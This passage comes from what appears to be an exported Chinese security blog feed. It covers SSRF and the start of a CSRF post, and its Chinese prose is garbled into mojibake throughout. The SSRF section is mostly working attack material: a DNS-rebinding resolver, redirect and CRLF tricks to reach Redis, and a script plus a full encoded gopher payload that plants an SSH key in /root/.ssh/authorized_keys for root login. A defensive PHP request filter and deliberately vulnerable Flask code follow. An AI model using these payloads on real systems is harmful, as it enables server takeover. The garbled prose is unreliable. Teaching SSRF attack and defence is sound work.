record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(name+<span class="string">" ===&gt; "</span>+ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><p>ç»“æœï¼ˆåªèƒ½æ¨¡æ‹Ÿä¸€ä¸‹æ•ˆæœï¼‰ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549441559220.png" alt="1549441559220"></p><h2 id="ç»•è¿‡åè®®é™åˆ¶"><a href="#ç»•è¿‡åè®®é™åˆ¶" class="headerlink" title="ç»•è¿‡åè®®é™åˆ¶"></a>ç»•è¿‡åè®®é™åˆ¶</h2><h3 id="302è·³è½¬"><a href="#302è·³è½¬" class="headerlink" title="302è·³è½¬"></a>302è·³è½¬</h3><p>æ”»å‡»è€…å»ºç«‹<a href="http://127.0.0.1:8888/302.phpï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/302.phpï¼š</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:  dict://127.0.0.1:6379/set:1:helo"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€è®¿é—®é¶æœºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://127.0.0.1:8888/302.php</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è„†å¼±æœåŠ¡å™¨6379ç«¯å£æ”¶åˆ°äº†è¯·æ±‚ï¼Œåè®®è¢«ç»•è¿‡ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549355712656.png" alt="1549355712656"></p><h3 id="ä½¿ç”¨-0d-0a-r-n"><a href="#ä½¿ç”¨-0d-0a-r-n" class="headerlink" title="ä½¿ç”¨%0d%0a(\r\n)"></a>ä½¿ç”¨%0d%0a(\r\n)</h3><p>ä¹‹æ‰€ä»¥è¦ä½¿ç”¨å…¶ä»–åè®®æ˜¯å› ä¸ºhttpçš„getè¯·æ±‚æ²¡æœ‰æ¢è¡Œï¼Œé‚£ä¹ˆåœ¨urlä¸­åŠ ä¸Š<code>%0d%0a</code>å°±æœ‰å¯èƒ½æ¨¡æ‹Ÿä¸€ä¸ªæ¢è¡Œæ“ä½œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">operator=http://wuyun.org:6379/helo</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">config set dir /etc/cron.d/</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">quit%0d%0a(\r\n)</span><br></pre></td></tr></table></figure><h2 id="Gopheråˆ©ç”¨Redisç¤ºä¾‹"><a href="#Gopheråˆ©ç”¨Redisç¤ºä¾‹" class="headerlink" title="Gopheråˆ©ç”¨Redisç¤ºä¾‹"></a>Gopheråˆ©ç”¨Redisç¤ºä¾‹</h2><p>gopher://åè®®å¯ä»¥æ¨¡æ‹Ÿå‡ºtcp clientçš„æ•ˆæœï¼Œå› æ­¤å¯ä»¥æ¨¡æ‹Ÿredis-cliï¼Œè‹¥æœåŠ¡å™¨rediså­˜åœ¨æ¼æ´çš„è¯ï¼Œå°±å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•ææƒã€‚</p><p>å‡†å¤‡ä¸€ä¸ªæ™®é€šredisæ”»å‡»æ—¶ç”¨çš„è„šæœ¬ï¼Œæ³¨æ„192.168.99.100å’Œ6379éœ€è¦æ›¿æ¢æˆè‡ªå·±çš„redis IPå’Œç«¯å£ï¼ˆä¸æ˜¯æ”»å‡»è€…çš„ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">cat ~/upload.txt | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x get tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x quit</span><br></pre></td></tr></table></figure><p>å…³äºè„šæœ¬çš„è§£é‡Šå¯ä»¥çœ‹<a href="http://anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/">redisæœªæˆæƒ&amp;å¼±å¯†ç æ¼æ´å¤ç°å’Œé˜²æŠ¤</a></p><p>æ‹¦æˆª6379çš„æ•°æ®åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.70.128:6379 2&gt;&amp;1|tee socat.log</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬ï¼Œå°†æ”»å‡»æµé‡æ‰“åˆ°æµ‹è¯•æœºå™¨ä¸Šï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash shell.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549458278181.png" alt="1549458278181"></p><p>è¿™æ—¶socaté‚£çœ‹åˆ°æ”»å‡»æµé‡ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549458694665.png" alt="1549458694665"></p><p>ä½¿ç”¨è„šæœ¬å°†æ”»å‡»æµé‡è½¬æ¢ä¸ºgopheråè®®ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹socatæ—¥å¿—è®°å½•tcpæµçš„æ ¼å¼ï¼š</p><ul><li><p><code>&lt;</code>å¼€å¤´ä¸€è¡Œè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€æ¥äº†ä¸€ä¸ªtcpåŒ…ï¼Œä¸‹é¢ä¸ºåŒ…å†…å®¹ï¼Œå¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019/02/06 21:58:17.968244  length=51 from=0 to=50</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$10\r</span><br><span class="line">/root/.ssh\r</span><br></pre></td></tr></table></figure></li><li><p><code>&gt;</code>å¼€å¤´ä¸€è¡Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›ä¸€ä¸ªtcpåŒ…ï¼Œä¸‹é¢ä¸ºåŒ…å†…å®¹ï¼Œå¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; 2019/02/06 21:58:17.981363  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure></li></ul><p>åŸºäºä»¥ä¸Šæ ¼å¼ï¼Œå°†å®¢æˆ·ç«¯å‘é€çš„tcpåŒ…è½¬æ¢ä¸ºpayloadï¼š</p><ul><li>å°†\rå­—ç¬¦ä¸²æ›¿æ¢æˆ%0d%0a</li><li>ç©ºç™½è¡Œæ›¿æ¢ä¸º%0a</li><li>ç©ºæ ¼æ›¿æ¢æˆ%20</li><li>å†ä½¿ç”¨urlencodeï¼ˆç»™phpæ—¶ä¼šåšä¸€æ¬¡decodeï¼Œcurlå†åšä¸€æ¬¡decodeï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">socat_file=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#  socat_file='./socat.log'</span></span><br><span class="line"></span><br><span class="line">client_tcp=<span class="literal">True</span></span><br><span class="line"><span class="keyword">with</span> open(socat_file) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&gt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&lt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> client_tcp:</span><br><span class="line">            <span class="comment"># åˆ¤æ–­å€’æ•°ç¬¬2ã€3å­—ç¬¦ä¸²æ˜¯å¦ä¸º\r</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">               <span class="comment"># å¦‚æœè¯¥è¡Œåªæœ‰\rï¼Œå°†\ræ›¿æ¢æˆ%0a%0d%0a</span></span><br><span class="line">               <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                   exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                   <span class="comment"># å»æ‰æœ€åçš„æ¢è¡Œç¬¦</span></span><br><span class="line">                   line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                   exp = exp + line</span><br><span class="line">            <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯ç©ºè¡Œï¼Œç©ºè¡Œæ›¿æ¢ä¸º%0a</span></span><br><span class="line">            <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">               exp = exp + <span class="string">'%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">               line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">               exp = exp + line</span><br><span class="line">exp=quote(exp)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python socat2gopher.py socat.log</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549509311002.png" alt="1549509311002"></p><p>å°†expç”¨gopheråè®®å‘é€ï¼ˆè¿™é‡Œçš„192.168.70.128:6379æ˜¯å—å®³è€…å†…ç½‘çš„redisæœåŠ¡å™¨ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">'http://127.0.0.1/ssrf.php?url=gopher://192.168.70.129:6379/_%2A3%250d%250a%243%250d%250aset%250d%250a%243%250d%250atmp%250d%250a%24413%250d%250a%250a%250a%250a%250assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDNPLyFJPazctB0%2BJAWQ8%2B5pNIOlGMYLmTupLXT5EjFkEDzKhkGu8l%2BC4ja/s4IIoMBtoxDPcogMLRFtxWv%2BA6WIvFQhAsqcaDBl48mXmsiHtKJbooNLplu/fTvdSjisnaF8Qsa/zRSWubPSfzzz5ObhsLhpXD/hcMofUZxofbysT0yWhmlTdC7i2GDIxlZPlSdpAxwPo0BgaP5GO/6GQ49GC4niw5j2UTAqBDQWqwWww5yxNXU/iY9YY83MUbMpuUlLgmpne1lFhY2jQ69uPiVPKUWWHPcNHgIeNqVAoTCFXSvjVgnDu/iHQSkm0o0uW/who12xgxAOXm3MU1cX9gL%2520anemone%40DESKTOP-ANEMONE%250a%250a%250a%250a%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2410%250d%250a/root/.ssh%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%2415%250d%250aauthorized_keys%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%243%250d%250atmp%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure><p>è¿”å›5ä¸ª<code>+OK</code>è¡¨ç¤ºå†™å…¥æˆåŠŸï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549509436064.png" alt="1549509436064"></p><p>å¯ä»¥çœ‹åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å…¬é’¥å·²ç»å†™å…¥ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549459966337.png" alt="1549459966337"></p><p>sshå¯ä»¥ç™»å½•ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549459989638.png" alt="1549459989638"></p><h1 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a>é˜²å¾¡æªæ–½</h1><p>è€ƒè™‘åˆ°ä»¥ä¸Šçš„å„ç§ç»•è¿‡ï¼Œäº§ç”Ÿå¦‚ä¸‹åŸºæœ¬æ€è·¯ï¼ˆå‚è€ƒpç¥çš„<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´</a>ï¼‰ï¼š</p><ol><li><p><strong>åªå…è®¸httpæˆ–httpsåè®®</strong></p></li><li><p>è§£æç›®æ ‡URLï¼Œè·å–å…¶host</p></li><li><p>è§£æhostï¼Œè·å–hostæŒ‡å‘çš„IPåœ°å€è½¬æ¢æˆlongå‹</p></li><li><p><strong>æ£€æŸ¥IPåœ°å€æ˜¯å¦ä¸ºå†…ç½‘IP</strong></p></li><li><p>è¯·æ±‚URL</p></li><li><p>å¦‚æœæœ‰è·³è½¬ï¼Œæ‹¿å‡ºè·³è½¬URLï¼Œæ‰§è¡Œ1(æˆ–è€…ç›´æ¥è¿›ç”¨302è·³è½¬)ï¼Œå¦åˆ™è¿”å›é¡µé¢ç»“æœ</p></li></ol><p>å‚è€ƒ<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">PHPå¼€å‘ä¸­é˜²å¾¡SSRF</a>ç»™å‡ºphpçš„å®ç°ï¼ˆPythonå®ç°è¯·çœ‹<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´</a>ï¼‰<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 0.åˆ¤æ–­URLåˆæ³•æ€§</span></span><br><span class="line">        <span class="keyword">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.ä»…å…è®¸httpæˆ–httpsåè®®</span></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?:\/\/.*$/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.è§£æç›®æ ‡URLï¼Œè·å–å…¶host</span></span><br><span class="line">        $host = parse_url($url, PHP_URL_HOST);</span><br><span class="line">        <span class="keyword">if</span>(!$host)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.è§£æhostï¼Œè·å–hostæŒ‡å‘çš„IPåœ°å€</span></span><br><span class="line">        $ip = gethostbyname($host);</span><br><span class="line">        $ip = ip2long($ip);</span><br><span class="line">        <span class="keyword">if</span>($ip === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.æ£€æŸ¥IPåœ°å€æ˜¯å¦ä¸ºå†…ç½‘IP</span></span><br><span class="line">        $is_inner_ipaddress = ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == $ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == $ip &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_inner_ipaddress)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.è¯·æ±‚URL</span></span><br><span class="line">        CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">        $res = CURL_EXEC($ch);</span><br><span class="line">        $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.å¦‚æœæœ‰è·³è½¬ï¼Œè·å–è·³è½¬URLæ‰§è¡Œ1, å¦åˆ™è¿”å›å“åº”</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">300</span>&lt;=$code <span class="keyword">and</span> $code&lt;<span class="number">400</span>)&#123;</span><br><span class="line">            $headers = curl_getinfo($ch);</span><br><span class="line">            $url=$headers[<span class="string">"redirect_url"</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CURL_CLOSE($ch) ;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="comment">// $url="http://localhost:8888/302.php";</span></span><br><span class="line">    $res=safe_request($url);</span><br><span class="line">    <span class="keyword">if</span>($res)</span><br><span class="line">        <span class="keyword">echo</span> var_dump($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>SSRFæ¼æ´åˆ†æä¸åˆ©ç”¨ï¼Œ<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">http://www.91ri.org/17111.html</a></li><li>SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿)ï¼Œ<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></li><li>SSRF Tipsï¼Œ<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></li><li>è°ˆä¸€è°ˆå¦‚ä½•åœ¨Pythonå¼€å‘ä¸­æ‹’ç»SSRFæ¼æ´ï¼Œ<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></li><li>PHPå¼€å‘ä¸­é˜²å¾¡SSRFï¼Œ<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">https://www.jianshu.com/p/6ea9b8652d73</a></li><li>SSRF in the Wild, <a href="https://medium.com/swlh/ssrf-in-the-wild-e2c598900434" target="_blank" rel="noopener">https://medium.com/swlh/ssrf-in-the-wild-e2c598900434</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡</title>
      <link href="/csrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/csrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRFæˆå› "><a href="#CSRFæˆå› " class="headerlink" title="CSRFæˆå› "></a>CSRFæˆå› </h1><h2 id="GETå‹"><a href="#GETå‹" class="headerlink" title="GETå‹"></a>GETå‹</h2><h3 id="è„†å¼±ä»£ç "><a href="#è„†å¼±ä»£ç " class="headerlink" title="è„†å¼±ä»£ç "></a>è„†å¼±ä»£ç </h3><p>å­˜åœ¨CSRFçš„GETå‹è¯·æ±‚å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        ret = <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">"No Privilege..."</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.args.get(<span class="string">"user"</span>, <span class="string">"Null"</span>)</span><br><span class="line">    session[<span class="string">"user"</span>]=user</span><br><span class="line">    template=<span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p>å…ˆä½¿ç”¨<a 